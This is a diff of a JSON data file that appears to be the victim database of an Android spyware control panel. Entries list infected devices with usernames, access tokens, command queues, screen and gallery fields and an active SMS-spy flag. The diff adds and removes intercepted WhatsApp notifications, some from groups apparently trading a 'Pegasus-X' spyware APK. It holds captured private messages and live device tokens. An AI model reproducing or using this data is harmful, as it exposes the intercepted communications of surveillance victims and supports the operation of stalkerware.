@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775979465,
+    "lastSeen": 1776775988278,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus-X ( No Update ) (4 pesan): ~ WHOHH",
+        "content": "cp",
+        "time": "21/04 19:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775990094
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus-X ( No Update ) (3 pesan): ~ Ajm",
+        "content": "Apk pega baru role VIP",
+        "time": "21/04 19:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775979487
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 19:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1776774270581
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (55 pesan): ~ OISHIX STORE REAL",
-        "content": "📷 STOK OISHIX STORE\n\n\nLOG GGL REBIND TW SEPAKET SPEK GGL VAULT JIBUN MAX 1 SG 2 RASA SPEK OLD OP?450+",
-        "time": "21/04 19:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774270518
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (208 pesan): ~ Pegasusx",
-        "content": "Apk yang work ada g",
-        "time": "21/04 19:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774270438
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775977285,
+    "lastSeen": 1776775989042,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775977558,
+    "lastSeen": 1776775989550,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775979105,
+    "lastSeen": 1776775988049,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
